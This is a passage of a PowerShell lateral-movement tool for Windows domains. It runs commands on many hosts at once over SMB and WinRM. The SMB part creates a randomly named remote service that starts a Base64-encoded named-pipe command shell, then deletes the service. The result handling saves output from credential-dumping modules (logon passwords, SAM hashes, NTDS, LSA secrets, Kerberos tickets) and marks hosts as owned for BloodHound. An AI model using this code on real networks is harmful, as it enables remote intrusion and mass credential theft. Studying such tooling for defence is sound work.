                    OS           = $OS
                    Completed    = $false
                })
        }


        do {
            foreach ($runspace in $runspaces | Where-Object { -not $_.Completed }) {

                if ($runspace.Handle.IsCompleted) {
                    $runspace.Completed = $true
                    $result = $null
                    $result = $runspace.Runspace.EndInvoke($runspace.Handle)[0]
                    $Cleanup = $runspace.Runspace.EndInvoke($runspace.Handle)[1]
                    $Class = $runspace.Runspace.EndInvoke($runspace.Handle)[2]
                    $hasDisplayedResult = $false
                    try {
                        $result = $result.Trim()
                    }
                    catch {}

                    if ($result -eq "Unable to connect") {
                        Continue
                    }

                    
                    elseif ($result -eq "Access Denied") {
                        $Global:AccessDeniedCount++
                        if ($successOnly) { continue }
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Red" `
                            -statusSymbol "[-] " `
                            -statusText "ACCESS DENIED" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        Continue
                    }
                    elseif ($Cleanup -eq "Failure") {
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Red" `
                            -statusSymbol "[WARNING] " `
                            -statusText "Error when performing cleanup. Cleanup with Remove-WmiObject -Class `"$Class`" -Namespace `"root\cimv2`" -ComputerName $($runspace.ComputerName)" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        Continue
                    }
                    elseif ($result -eq "Unspecified Error") {
                        if ($successOnly) { continue }
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Red" `
                            -statusSymbol "[-] " `
                            -statusText "ERROR" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        Continue
                    }
                    elseif ($result -eq "Timed Out") {
                        if ($successOnly) { continue }
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Yellow" `
                            -statusSymbol "[*] " `
                            -statusText "TIMED OUT" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        Continue
                    }
                    elseif ($result -eq "NotDomainController" -and ($Module -eq "NTDS" -or $Module -eq "lsa-trust")) {
                        if ($successOnly) { continue }
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Yellow" `
                            -statusSymbol "[*] " `
                            -statusText "NON-DOMAIN CONTROLLER" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        Continue
                    }
                    elseif ($result -like "*ActualConfig: Invalid namespace*" -and $Module -eq "SCCM") {
                        if ($successOnly) { continue }
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Yellow" `
                            -statusSymbol "[*] " `
                            -statusText "NOT SCCM CLIENT" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        Continue
                    }
                    elseif ($result -eq "No Results" -and $Module -eq "WinSCP") {
                        if ($successOnly) { continue }
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Yellow" `
                            -statusSymbol "[*] " `
                            -statusText "No Results" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        Continue
                    }

                    elseif ($result -eq "RunAsPPL Disabled") {
                        $Global:SuccessCount++
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Green" `
                            -statusSymbol "[+] " `
                            -statusText "RunAsPPL Disabled" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        Continue
                    }

                    elseif ($result -eq "RunAsPPL Enabled") {
                        if ($successOnly) { continue }
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Red" `
                            -statusSymbol "[-] " `
                            -statusText "RunAsPPL Disabled" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        Continue
                    }

                    elseif ($result -eq "Successful Connection PME") {
                        $Global:SuccessCount++
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Green" `
                            -statusSymbol "[+] " `
                            -statusText "SUCCESS" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) `
                            -Domain $Domain `
                            -ComputerOwned
                        Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) `
                            -Domain $Domain `
                            -UserName $Username `
                            -AdminToProperty
                        Continue
                    }
                    elseif ($result -match "[a-zA-Z0-9]") {
                        if ($result -eq "No Results") {
                            if ($successOnly) { continue }
                            Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                                -OS $($runspace.OS) `
                                -statusColor "Yellow" `
                                -statusSymbol "[*] " `
                                -statusText "NO RESULTS" `
                                -NameLength $NameLength `
                                -OSLength $OSLength
                            Continue
                        }
                        else {
                            $Global:SuccessCount++
                            Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                                -OS $($runspace.OS) `
                                -statusColor "Green" `
                                -statusSymbol "[+] " `
                                -statusText "SUCCESS" `
                                -NameLength $NameLength `
                                -OSLength $OSLength
                            Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) `
                                -Domain $Domain `
                                -ComputerOwned
                            Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) `
                                -Domain $Domain `
                                -UserName $Username `
                                -AdminToProperty

                            $filePath = switch ($Module) {
                                "ConsoleHistory" { "$ConsoleHistory\$($runspace.ComputerName)-ConsoleHistory.txt" }
                                "eKeys" { "$eKeys\$($runspace.ComputerName)-eKeys.txt" }
                                "FileZilla" { "$FileZilla\$($runspace.ComputerName)-FileZilla.txt" }
                                "Files" { "$UserFiles\$($runspace.ComputerName)-UserFiles.txt" }
                                "KerbDump" { "$Tickets\$($runspace.ComputerName)-Tickets-KerbDump.txt" }
                                "LogonPasswords" { "$LogonPasswords\$($runspace.ComputerName)-LogonPasswords.txt" }
                                "LSA" { "$LSADump\$($runspace.ComputerName)-LSA.txt" }
                                "LSA-Trust" { "$LSATrust\$($runspace.ComputerName)-Trust.txt" }
                                "MDF" { "$MDF\$($runspace.ComputerName)-MDF.txt" }
                                "NTDS" { "$DCSyncFullDump\$($runspace.ComputerName)-NTDS.txt" }
                                "NTLM" { "$NTLM\$($runspace.ComputerName)-NTLM.txt" }
                                "Notepad" { "$Notepad\$($runspace.ComputerName)-Notepad.txt" }
                                "SAM" { "$SAM\$($runspace.ComputerName)-SAMHashes.txt" }
                                "SCCM" { "$SCCM\$($runspace.ComputerName)-SCCM.txt" }
                                "SessionExec" { "$SessionExec\$($runspace.ComputerName)-SessionExec.txt" }
                                "SessionRelay" { "$SessionRelay\$($runspace.ComputerName)-SessionRelay.txt" }
                                "SSH" { "$SSH\$($runspace.ComputerName)-SSH.txt" }
                                "TGTDeleg" { "$TGTDeleg\$($runspace.ComputerName)-TGTDeleg.txt" }
                                "Tickets" { "$MimiTickets\$($runspace.ComputerName)-Tickets.txt" }
                                "VNC" { "$VNCDump\$($runspace.ComputerName)-VNC.txt" }
                                "Wifi" { "$Wifi\$($runspace.ComputerName)-Wifi.txt" }
                                "WinSCP" { "$WinSCP\$($runspace.ComputerName)-WinSCP.txt" }
                                default { $null }
                            }

                            if ($filePath) {
                                $result | Out-File -FilePath $filePath -Encoding "ASCII"

                                if ($ShowOutput) {
                                    $result | Write-Output
                                    Write-Output ""
                                    $hasDisplayedResult = $true
                                }
                            }

                            # Handle the default case.
                            if (-not $Module -and -not $hasDisplayedResult) {
                                $result | Write-Output
                                Write-Output ""
                                $hasDisplayedResult = $true
                            }
                        }
                    }
                    elseif ($result -notmatch "[a-zA-Z0-9]") {
                        $Global:SuccessCount++
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Green" `
                            -statusSymbol "[+] " `
                            -statusText "SUCCESS " `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) `
                            -Domain $Domain `
                            -ComputerOwned
                        Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) `
                            -Domain $Domain `
                            -UserName $Username `
                            -AdminToProperty
                        Continue
                    }

                    # Dispose of runspace and close handle
                    $runspace.Runspace.Dispose()
                    $runspace.Handle.AsyncWaitHandle.Close()
                }
            }

            Start-Sleep -Milliseconds 100
        } while ($runspaces | Where-Object { -not $_.Completed })


        $runspacePool.Close()
        $runspacePool.Dispose()
    }

    ################################################################################################################
    ############################################## Function: SMB ################################################
    ################################################################################################################
    Function Method-SMB {

        Write-host

        $runspacePool = [runspacefactory]::CreateRunspacePool(1, $Threads)
        $runspacePool.Open()
        $runspaces = New-Object System.Collections.ArrayList

        $scriptBlock = {
            param($ComputerName, $Command, $Timeout)
    
            $tcpClient = New-Object System.Net.Sockets.TcpClient
            $asyncResult = $tcpClient.BeginConnect($ComputerName, 445, $null, $null)
            $wait = $asyncResult.AsyncWaitHandle.WaitOne($Timeout) 

            if ($wait) { 
                try {
                    $tcpClient.EndConnect($asyncResult)
                    $connected = $true
                }
                catch {
                    $connected = $false
                }
            }
            else {
                $connected = $false
            }

            $tcpClient.Close()
            if (!$connected) { return "Unable to connect" }   
    
            $SMBCheck = $false
            $SMBCheck = Test-Path "\\$ComputerName\c$" -ErrorAction "SilentlyContinue"

            if (!$SMBCheck) {
                return "Access Denied"
            }

            if ([string]::IsNullOrWhiteSpace($Command)) {
                return "Successful connection PME"
            }

    
            function Invoke-SMBRemoting {
	
                param (
                    [string]$PipeName,
                    [string]$ComputerName,
                    [string]$ServiceName,
                    [string]$Command,
                    [string]$Timeout = "80000",
                    [switch]$Verbose
                )
	
                $ErrorActionPreference = "SilentlyContinue"
                $WarningPreference = "SilentlyContinue"
                Set-Variable MaximumHistoryCount 32767

                $ComputerName = $ComputerName + "\"
	
                if (-not $ComputerName) {
                    Write-Output " [-] Please specify a Target"
                    return
                }
	
                if (!$PipeName) {
                    $randomvalue = ((65..90) + (97..122) | Get-Random -Count 16 | % { [char]$_ })
                    $randomvalue = $randomvalue -join ""
                    $PipeName = $randomvalue
                }
	
                if (!$ServiceName) {
                    $randomvalue = ((65..90) + (97..122) | Get-Random -Count 16 | % { [char]$_ })
                    $randomvalue = $randomvalue -join ""
                    $ServiceName = "Service_" + $randomvalue
                }
	
                $ServerScript = @"
`$pipeServer = New-Object System.IO.Pipes.NamedPipeServerStream("$PipeName", 'InOut', 1, 'Byte', 'None', 4096, 4096, `$null)
`$tcb={param(`$state);`$state.Close()};
`$tm = New-Object System.Threading.Timer(`$tcb, `$pipeServer, 600000, [System.Threading.Timeout]::Infinite);
`$pipeServer.WaitForConnection()
`$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite);
`$tm.Dispose();
`$sr = New-Object System.IO.StreamReader(`$pipeServer)
`$sw = New-Object System.IO.StreamWriter(`$pipeServer)
while (`$true) {
	if (-not `$pipeServer.IsConnected) {
		break
	}
	`$command = `$sr.ReadLine()
	if (`$command -eq "exit") {break} 
	else {
		try{
			`$result = Invoke-Expression `$command | Out-String
			`$result -split "`n" | ForEach-Object {`$sw.WriteLine(`$_.TrimEnd())}
		} catch {
			`$errorMessage = `$_.Exception.Message
			`$sw.WriteLine(`$errorMessage)
		}
		`$sw.WriteLine("###END###")
		`$sw.Flush()
	}
}
`$pipeServer.Disconnect()
`$pipeServer.Dispose()
"@
	
                $B64ServerScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ServerScript))
	
                $arguments = "\\$ComputerName create $ServiceName binpath= `"C:\Windows\System32\cmd.exe /c powershell.exe -enc $B64ServerScript`""
	
                $startarguments = "\\$ComputerName start $ServiceName"
	
                Start-Process sc.exe -ArgumentList $arguments -WindowStyle Hidden
	
                Start-Sleep -Milliseconds 1000
	
                Start-Process sc.exe -ArgumentList $startarguments -WindowStyle Hidden
	
                if ($Verbose) {
                    Write-Output ""
                    Write-Output " [+] Pipe Name: $PipeName"
                    Write-Output ""
                    Write-Output " [+] Service Name: $ServiceName"
                    Write-Output ""
                    Write-Output " [+] Creating Service on Remote Target..."
                }
                #Write-Output ""
	
                # Get the current process ID
                $currentPID = $PID
	
                # Embedded monitoring script
                $monitoringScript = @"
`$serviceToDelete = "$ServiceName" # Name of the service you want to delete
`$TargetServer = "$ComputerName"
`$primaryScriptProcessId = $currentPID

while (`$true) {
	Start-Sleep -Seconds 5 # Check every 5 seconds

	# Check if the primary script is still running using its Process ID
	`$process = Get-Process | Where-Object { `$_.Id -eq `$primaryScriptProcessId }

	if (-not `$process) {
		# If the process is not running, delete the service
		`$stoparguments = "\\`$TargetServer delete `$serviceToDelete"
		Start-Process sc.exe -ArgumentList `$stoparguments -WindowStyle Hidden
		break
	}
}
"@
	
                $b64monitoringScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($monitoringScript))
	
                # Execute the embedded monitoring script in a hidden window
                $MonitoringProcess = Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -enc $b64monitoringScript" -WindowStyle Hidden -PassThru
	
                $pipeClient = New-Object System.IO.Pipes.NamedPipeClientStream("$ComputerName", $PipeName, 'InOut')
	
                try {
                    $pipeClient.Connect($Timeout)
                }
                catch [System.TimeoutException] {
                    return "Timed Out"

                }
                catch {
                    Write-Output "unexpected error"
                    Write-Output ""
                    return
                }

                $sr = New-Object System.IO.StreamReader($pipeClient)
                $sw = New-Object System.IO.StreamWriter($pipeClient)

                $serverOutput = ""
	
        
                $Command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Command))
                $fullCommand = "[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(""$Command"")) | Out-String | IEX"
                $sw.WriteLine($fullCommand)
                $sw.Flush()
                while ($true) {
                    $line = $sr.ReadLine()
                    if ($line -eq "###END###") {
                        Write-Output $serverOutput.Trim()
                        Write-Output ""
                        break
                    }
                    else {
                        $serverOutput += "$line`n"
                    }
                } 
	
	

                $stoparguments = "\\$ComputerName delete $ServiceName"
                Start-Process sc.exe -ArgumentList $stoparguments -WindowStyle Hidden
                $pipeClient.Close()
                $pipeClient.Dispose()
                Stop-process -Id $MonitoringProcess.Id -ErrorAction "SilentlyContinue" -Force
            }
            return Invoke-SMBRemoting -ComputerName $ComputerName -Command $Command
        }

        # Create and invoke runspaces for each computer
        foreach ($computer in [array]$Computers) {

            if (!$IPAddress) {
                $ComputerName = $computer.Properties["dnshostname"][0]
                $OS = $computer.Properties["operatingSystem"][0]
            }

            elseif ($IPAddress) {
                $ComputerName = "$Computer"
                $OS = "OS:PLACEHOLDER"
            }

            $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($ComputerName).AddArgument($Command).AddArgument($Timeout)
            $runspace.RunspacePool = $runspacePool

            [void]$runspaces.Add([PSCustomObject]@{
                    Runspace     = $runspace
                    Handle       = $runspace.BeginInvoke()
                    ComputerName = $ComputerName
                    OS           = $OS
                    Completed    = $false
                })
        }

        
        [int]$Global:SuccessCount = 0

        do {
            foreach ($runspace in $runspaces | Where-Object { -not $_.Completed }) {

                if ($runspace.Handle.IsCompleted) {
                    $runspace.Completed = $true
                    $result = $runspace.Runspace.EndInvoke($runspace.Handle)
                    $hasDisplayedResult = $false
                    try {
                        $result = $result.Trim()
                    }
                    catch {}

                    # [other conditions for $result]
                    if ($result -eq "Access Denied") {
                        if ($successOnly) { continue }
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Red" `
                            -statusSymbol "[-] " `
                            -statusText "ACCESS DENIED" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        continue
                    }
                    elseif ($result -eq "Unexpected Error") {
                        if ($successOnly) { continue }
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Yellow" `
                            -statusSymbol "[*] " `
                            -statusText "ERROR" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        continue
                    }
                    elseif ($result -eq "Timed Out") {
                        if ($successOnly) { continue }
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Yellow" `
                            -statusSymbol "[*] " `
                            -statusText "TIMED OUT" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        continue
                    }
                    elseif ($result -eq "NotDomainController" -and ($Module -eq "NTDS" -or $Module -eq "lsa-trust")) {
                        if ($successOnly) { continue }
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Yellow" `
                            -statusSymbol "[*] " `
                            -statusText "NON-DOMAIN CONTROLLER" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        continue
                    }
                    elseif ($result -like "*Object reference not set to an instance of an object.*" -and $Module -eq "SCCM") {
                        if ($successOnly) { continue }
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Yellow" `
                            -statusSymbol "[*] " `
                            -statusText "NOT SCCM CLIENT" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        continue
                    }
                    elseif ($result -eq "No Results" -and $Module -eq "WinSCP") {
                        if ($successOnly) { continue }
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Yellow" `
                            -statusSymbol "[*] " `
                            -statusText "NO RESULTS" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        continue
                    }

                    elseif ($result -eq "RunAsPPL Disabled") {
                        $Global:SuccessCount++
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Green" `
                            -statusSymbol "[+] " `
                            -statusText "RunAsPPL Disabled" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        Continue
                    }

                    elseif ($result -eq "RunAsPPL Enabled") {
                        if ($successOnly) { continue }
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Red" `
                            -statusSymbol "[-] " `
                            -statusText "RunAsPPL Disabled" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        Continue
                    }

                    elseif ($result -eq "Successful Connection PME") {
                        $Global:SuccessCount++
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Green" `
                            -statusSymbol "[+] " `
                            -statusText "SUCCESS" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) `
                            -Domain $Domain `
                            -ComputerOwned
                        Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) `
                            -Domain $Domain `
                            -UserName $Username `
                            -AdminToProperty
                        continue
                    }
                    
                    elseif ($result -eq "Unable to connect") {}

                    elseif ($result -match "[a-zA-Z0-9]") {
                        if ($result -eq "No Results") {
                            if ($successOnly) { continue }
                            Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                                -OS $($runspace.OS) `
                                -statusColor "Yellow" `
                                -statusSymbol "[*] " `
                                -statusText "NO RESULTS" `
                                -NameLength $NameLength `
                                -OSLength $OSLength
                            continue
                        }
                        else {
                            $Global:SuccessCount++
                            Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                                -OS $($runspace.OS) `
                                -statusColor "Green" `
                                -statusSymbol "[+] " `
                                -statusText "SUCCESS" `
                                -NameLength $NameLength `
                                -OSLength $OSLength
                            Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) `
                                -Domain $Domain `
                                -ComputerOwned
                            Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) `
                                -Domain $Domain `
                                -UserName $Username `
                                -AdminToProperty

                            $filePath = switch ($Module) {
                                "ConsoleHistory" { "$ConsoleHistory\$($runspace.ComputerName)-ConsoleHistory.txt" }
                                "eKeys" { "$eKeys\$($runspace.ComputerName)-eKeys.txt" }
                                "FileZilla" { "$FileZilla\$($runspace.ComputerName)-FileZilla.txt" }
                                "Files" { "$UserFiles\$($runspace.ComputerName)-UserFiles.txt" }
                                "KerbDump" { "$Tickets\$($runspace.ComputerName)-Tickets-KerbDump.txt" }
                                "LogonPasswords" { "$LogonPasswords\$($runspace.ComputerName)-LogonPasswords.txt" }
                                "LSA" { "$LSADump\$($runspace.ComputerName)-LSA.txt" }
                                "LSA-Trust" { "$LSATrust\$($runspace.ComputerName)-Trust.txt" }
                                "MDF" { "$MDF\$($runspace.ComputerName)-MDF.txt" }
                                "NTDS" { "$DCSyncFullDump\$($runspace.ComputerName)-NTDS.txt" }
                                "NTLM" { "$NTLM\$($runspace.ComputerName)-NTLM.txt" }
                                "Notepad" { "$Notepad\$($runspace.ComputerName)-Notepad.txt" }
                                "SAM" { "$SAM\$($runspace.ComputerName)-SAMHashes.txt" }
                                "SCCM" { "$SCCM\$($runspace.ComputerName)-SCCM.txt" }
                                "SessionExec" { "$SessionExec\$($runspace.ComputerName)-SessionExec.txt" }
                                "SessionRelay" { "$SessionRelay\$($runspace.ComputerName)-SessionRelay.txt" }
                                "SSH" { "$SSH\$($runspace.ComputerName)-SSH.txt" }
                                "TGTDeleg" { "$TGTDeleg\$($runspace.ComputerName)-TGTDeleg.txt" }
                                "Tickets" { "$MimiTickets\$($runspace.ComputerName)-Tickets.txt" }
                                "VNC" { "$VNCDump\$($runspace.ComputerName)-VNC.txt" }
                                "Wifi" { "$Wifi\$($runspace.ComputerName)-Wifi.txt" }
                                "WinSCP" { "$WinSCP\$($runspace.ComputerName)-WinSCP.txt" }
                                default { $null }
                            }

                            if ($filePath) {
                                $result | Out-File -FilePath $filePath -Encoding "ASCII"

                                if ($ShowOutput) {
                                    $result | Write-Output
                                    Write-Output ""
                                    $hasDisplayedResult = $true
                                }
                            }

                            # Handle the default case.
                            if (-not $Module -and -not $hasDisplayedResult) {
                                $result | Write-Output
                                Write-Output ""
                                $hasDisplayedResult = $true
                            }
                        }
                    }
                    elseif ($result -notmatch "[a-zA-Z0-9]") {
                        $Global:SuccessCount++
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Green" `
                            -statusSymbol "[+] " `
                            -statusText "SUCCESS" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) `
                            -Domain $Domain `
                            -ComputerOwned
                        Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) `
                            -Domain $Domain `
                            -UserName $Username `
                            -AdminToProperty
                        continue
                    }

                    # Dispose of runspace and close handle
                    $runspace.Runspace.Dispose()
                    $runspace.Handle.AsyncWaitHandle.Close()
                }
            }

            Start-Sleep -Milliseconds 100
        } while ($runspaces | Where-Object { -not $_.Completed })


        $runspacePool.Close()
        $runspacePool.Dispose()

    }

    ################################################################################################################
    ############################################### Function: WinRM ################################################
    ################################################################################################################
    Function Method-WinRM {
        Write-host

        # Create a runspace pool
        $runspacePool = [runspacefactory]::CreateRunspacePool(1, $Threads)
        $runspacePool.Open()
        $runspaces = New-Object System.Collections.ArrayList

        $scriptBlock = {
            param ($computerName, $Command, $Timeout, $Module, $IPAddress)
    
            $tcpClient = New-Object System.Net.Sockets.TcpClient
            $asyncResult = $tcpClient.BeginConnect($ComputerName, 5985, $null, $null)
            $wait = $asyncResult.AsyncWaitHandle.WaitOne($Timeout) 

            if ($wait) { 
                try {
                    $tcpClient.EndConnect($asyncResult)
                    $connected = $true
                }
                catch {
                    $connected = $false
                }
            }
            else {
                $connected = $false
            }

            $tcpClient.Close()
            if (!$connected) { return "Unable to connect" }

            if ($IPAddress) {
                # Define the function before using it
                function Resolve-IPToDNSName {
                    param (
                        [string]$IPAddress
                    )
                    try {
                        $hostEntry = [System.Net.Dns]::GetHostEntry($IPAddress)
                        return $hostEntry.HostName
                    }
                    catch {
                        return "Unable to resolve"
                    }
                }

                # Use the function to resolve DNS Name
                $ComputerName = Resolve-IPToDNSName -IPAddress $ComputerName
                if ($ComputerName -eq "Unable to resolve") { return "Unable to resolve" }

            }
      
            try {
                # Leave these comments here because its a clusterfuck
                # Check if the module is "Amnesiac"
                if ($Module -eq "Amnesiac") {
                    # Test the connection by invoking a simple echo command
                    $result = Invoke-Command -ComputerName $computerName -ScriptBlock {
                        Write-Output "Successful Connection PME"
                    } -ErrorAction Stop

                    # If the test command succeeded, proceed with the actual command
                    if ($result) {
                        # Define a script block that will execute the command
                        $AscriptBlock = {
                            param($command)
                            Invoke-Expression $command
                        }

                        # Execute the command as a background job and ignore the job object
                        Invoke-Command -ComputerName $computerName -ScriptBlock $AscriptBlock -ArgumentList $Command -AsJob | Out-Null
                        # Return a success message
                        return "Successful Connection PME"
                    }
                    else {
                        # If the test command failed, return an access denied message
                        return "Access Denied"
                    }
                }
                elseif ($Command -eq "") {
                    # If the command is empty, execute a simple echo command
                    $result = Invoke-Command -ComputerName $computerName -ScriptBlock {
                        Write-Output "Successful Connection PME"
                    } -ErrorAction Stop

                    # If the result is empty, ensure a success message is returned
                    if (-not $result) {
                        $result = "Successful Connection PME"
                    }

                    # Return the result
                    return $result
                }
                elseif ($Command -ne "") {
                    # If a command is provided, execute it
                    $result = Invoke-Command -ComputerName $computerName -ScriptBlock {
                        Invoke-Expression $Using:Command
                    } -ErrorAction Stop

                    # If the result is empty, ensure a success message is returned
                    if (-not $result) {
                        $result = "Successful Connection PME"
                    }

                    # Return the result
                    return $result
                }
            }
            catch {
                # Handle exceptions based on their message
                if ($_.Exception.Message -like "*Access is Denied*") {
                    return "Access Denied"
                }
                elseif ($_.Exception.Message -like "*cannot be resolved*") {
                    return "Unable to connect"
                }

                elseif ($_.Exception.Message -like "*cannot find the computer*") {
                    return "cannot find the computer"
                }

                elseif ($_.Exception.Message -like "*Object reference not set to an instance of an object.*") {
                    return "Object reference not set to an instance of an object."
                }

                else {
                    return "Unspecified Error"
                }
            }

        }

        # Create and invoke runspaces for each computer
        foreach ($computer in [array]$Computers) {

            if (!$IPAddress) {
                $ComputerName = $computer.Properties["dnshostname"][0]
                $OS = $computer.Properties["operatingSystem"][0]
            }

            elseif ($IPAddress) {
                $ComputerName = "$Computer"
                $OS = "OS:PLACEHOLDER"
            }
    
            $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($ComputerName).AddArgument($Command).AddArgument($Timeout).AddArgument($Module).AddArgument($IPAddress)
            $runspace.RunspacePool = $runspacePool

            [void]$runspaces.Add([PSCustomObject]@{
                    Runspace     = $runspace
                    Handle       = $runspace.BeginInvoke()
                    ComputerName = $ComputerName
                    OS           = $OS
                    Completed    = $false
                })
        }

        [int]$Global:SuccessCount = 0

        do {
            foreach ($runspace in $runspaces | Where-Object { -not $_.Completed }) {

                if ($runspace.Handle.IsCompleted) {
                    $runspace.Completed = $true
                    $result = $runspace.Runspace.EndInvoke($runspace.Handle)
                    $hasDisplayedResult = $false

                    # [other conditions for $result]
                    if ($result -eq "Access Denied") {
                        if ($successOnly) { continue }
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Red" `
                            -statusSymbol "[-] " `
                            -statusText "ACCESS DENIED" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        Continue
                    }
                    elseif ($result -eq "Unspecified Error") {
                        if ($successOnly) { continue }
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Red" `
                            -statusSymbol "[-] " `
                            -statusText "ERROR" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        Continue
                    }
                    elseif ($result -eq "Unable to resolve") {
                        if ($successOnly) { continue }
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Yellow" `
                            -statusSymbol "[*] " `
                            -statusText "Unable to resolve DNS name, required for WinRM" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        Continue
                    }
                    elseif ($result -like "*Cannot find the computer*") {
                        if ($successOnly) { continue }
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Yellow" `
                            -statusSymbol "[*] " `
                            -statusText "Unable to fully resolve the FQDN" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        Continue
                    }
                    elseif ($result -eq "Timed Out") {
                        if ($successOnly) { continue }
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Yellow" `
                            -statusSymbol "[*] " `
                            -statusText "TIMED OUT" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        Continue
                    }
                    elseif ($result -eq "NotDomainController" -and ($Module -eq "NTDS" -or $Module -eq "lsa-trust")) {
                        if ($successOnly) { continue }
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Yellow" `
                            -statusSymbol "[*] " `
                            -statusText "NON-DOMAIN CONTROLLER" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        Continue
                    }
                    elseif ($result -like "*Object reference not set to an instance of an object.*" -and $Module -eq "SCCM") {
                        if ($successOnly) { continue }
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Yellow" `
                            -statusSymbol "[*] " `
                            -statusText "NOT SCCM CLIENT" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        Continue
                    }
                    elseif ($result -eq "No Results" -and $Module -eq "WinSCP") {
                        if ($successOnly) { continue }
